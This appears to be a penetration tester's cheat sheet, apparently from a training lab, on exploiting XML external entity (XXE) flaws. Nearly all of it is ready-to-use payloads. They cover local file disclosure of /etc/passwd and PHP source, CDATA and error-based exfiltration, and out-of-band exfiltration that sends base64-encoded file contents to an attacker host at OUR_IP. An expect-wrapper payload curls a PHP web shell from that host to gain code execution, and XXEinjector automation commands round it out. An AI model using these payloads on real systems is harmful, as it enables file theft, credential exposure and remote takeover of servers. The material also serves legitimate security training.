## Identifying XXE

- Find a page that accept XML input such as Contact Form.
- Intercept Request in Burp and see if this is XML in the body.
- Look if entities of XML input is reflected in response, *if not try Error Based or Blind XXE*
- The element reflected is the one that may vulnerable to XXE
- Then, create entity that we will place inside the reflected entity
- If this works, this is vulnerable to XXE

```dtd
<!DOCTYPE email [
  <!ENTITY company "Inlane Freight">
]>
```

```Note
Some web applications may default to a JSON format in HTTP request, but may still accept other formats, including XML. So, even if a web app sends requests in a JSON format, we can try changing the `Content-Type` header to `application/xml`, and then convert the JSON data to XML with (https://www.convertjson.com/json-to-xml.htm)
```

---

## Local File Disclosure
#### File read
```dtd
<!DOCTYPE email [
  <!ENTITY company SYSTEM "file:///etc/passwd">
]>
```

```Tip
In certain Java web applications, we may also be able to specify a directory instead of a file, and we will get a directory listing instead, which can be useful for locating sensitive files.
```
#### Reading Source Code (Works only for PHP)
```dtd
<!DOCTYPE email [
  <!ENTITY company SYSTEM "php://filter/convert.base64-encode/resource=index.php">
]>
```

---

## Advance File Disclosure 
#### Advanced Exfiltration with CDATA (Easiest,works on non-PHP servers)

To output data that do not confirm to the XML format, we can wrap the content of the external file reference with a `CDATA` tag (e.g. `<![CDATA[ FILE_CONTENT ]]>`). 

```shell
echo '<!ENTITY joined "%begin;%file;%end;">' > xxe.dtd

python3 -m http.server 8000
```

Then:
```dtd
<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA[">
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> 
  <!ENTITY % end "]]>">
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %xxe;
]>
...
<email>&joined;</email>
```

**Note:** In some modern web servers, we may not be able to read some files.

---

## Remote Code Execution

We can look for `ssh` private key.
If it's windows we can try to coerce authentication and get a hash with `Responder`.

We can try the expect wrapper, if it's enable we get `RCE`.
```shell
echo '<?php system($_REQUEST["cmd"]);?>' > shell.php

python3 -m http.server 80
```

Send this payload:
```dtd
<?xml version="1.0"?>
<!DOCTYPE email [
  <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
]>
<root>
<name></name>
<tel></tel>
<email>&company;</email>
<message></message>
</root>
```

---

## Error Based XXE

If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit.

First, let's try to send malformed XML data, and see if the web application displays any errors. (reference a non-existing entity)
We see that we did indeed cause the web application to display an error. 
First, we will host a DTD file that contains the following payload:
```dtd
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">
```

We purposely provoke an error to display output.
```dtd
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>
```

**Note**: This method is less reliable and can break with bad chars or too much chars.

---

## Blind XXE
#### Out of Band Blind XXE

Instead of having the web application output our `file` entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.

We can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the `file` parameter value as part of the URL being requested over HTTP, as follows:

```dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'>">
```

Litlle server that decode base64 encoded retrieved files:
```php
<?php
if(isset($_GET['content'])){
    error_log("\n\n" . base64_decode($_GET['content']));
}
?>
```

```shell
php -S 0.0.0.0:8000
```

Payloads:
```dtd
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>
```

#### Automated OOB Exfiltration

We can automate this with a tool name  [XXEinjector](https://github.com/enjoiz/XXEinjector).
We can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write `XXEINJECT` after it as a position locator for the tool:

```http
POST /blind/submitDetails.php HTTP/1.1
Host: 10.129.201.94
Content-Length: 169
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
Content-Type: text/plain;charset=UTF-8
Accept: */*
Origin: http://10.129.201.94
Referer: http://10.129.201.94/blind/
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Connection: close

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
```

We can run the tool with the `--host`/`--httpport` flags being our IP and port.
The `--file` flag being the file we wrote the request in.
The `--path` flag being the file we want to read.

```shell
ruby XXEinjector.rb --host=[tun0 IP] --httpport=8000 --file=/tmp/xxe.req --path=/etc/passwd --oob=http --phpfilter
```

---